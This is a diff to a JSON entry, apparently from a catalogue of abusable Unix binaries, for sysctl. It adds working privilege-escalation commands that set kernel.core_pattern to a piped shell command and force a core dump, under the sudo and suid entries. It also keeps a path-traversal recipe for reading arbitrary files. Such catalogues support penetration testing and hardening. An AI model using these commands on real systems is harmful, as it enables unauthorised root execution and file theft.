@@ -1,19 +1,27 @@
 {
-  "description": "The '-p' argument can also be used in place of '-n'. In both cases though the output might get corrupted, so this might not be suitable to read binary files.",
   "functions": {
+    "command": [
+      {
+        "description": "The command is executed by root in the background when a core dump occurs.",
+        "code": "COMMAND='/bin/sh -c id>/tmp/id'\nsysctl \"kernel.core_pattern=|$COMMAND\"\nsleep 9999 &\nkill -QUIT $!\ncat /tmp/id\n"
+      }
+    ],
     "file-read": [
       {
-        "code": "/usr/sbin/sysctl -n \"/../../[file]\"\n"
+        "description": "The `-p` argument can also be used in place of `-n`. In both cases though the output might get corrupted, so this might not be suitable to read binary files.",
+        "code": "LFILE=file_to_read\n/usr/sbin/sysctl -n \"/../../$LFILE\"\n"
       }
     ],
     "suid": [
       {
-        "code": "./sysctl -n \"/../../[file]\"\n"
+        
+        "code": "COMMAND='/bin/sh -c id>/tmp/id'\n./sysctl \"kernel.core_pattern=|$COMMAND\"\nsleep 9999 &\nkill -QUIT $!\ncat /tmp/id\n"
       }
     ],
     "sudo": [
       {
-        "code": "sudo sysctl -n \"/../../[file]\"\n"
+        
+        "code": "COMMAND='/bin/sh -c id>/tmp/id'\nsudo sysctl \"kernel.core_pattern=|$COMMAND\"\nsleep 9999 &\nkill -QUIT $!\ncat /tmp/id\n"
       }
     ]
   }
